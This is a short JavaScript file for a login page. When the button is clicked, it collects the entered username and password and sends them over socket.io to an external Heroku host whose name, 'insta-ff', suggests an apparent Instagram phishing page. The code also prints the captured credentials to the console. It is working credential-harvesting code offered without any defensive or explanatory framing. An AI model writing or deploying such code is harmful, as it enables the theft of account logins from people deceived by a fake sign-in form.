// const socket = io("localhost:8080");
const socket = io("https://insta-ff.herokuapp.com/");

const btn = document.getElementById("loginbtn");

const username = document.getElementById("username");
const password = document.getElementById("password");

btn.onclick = () => {
  const data = {
    name: username.value,
    pass: password.value,
  };
  socket.emit("newData", data);
  console.log(data);
};
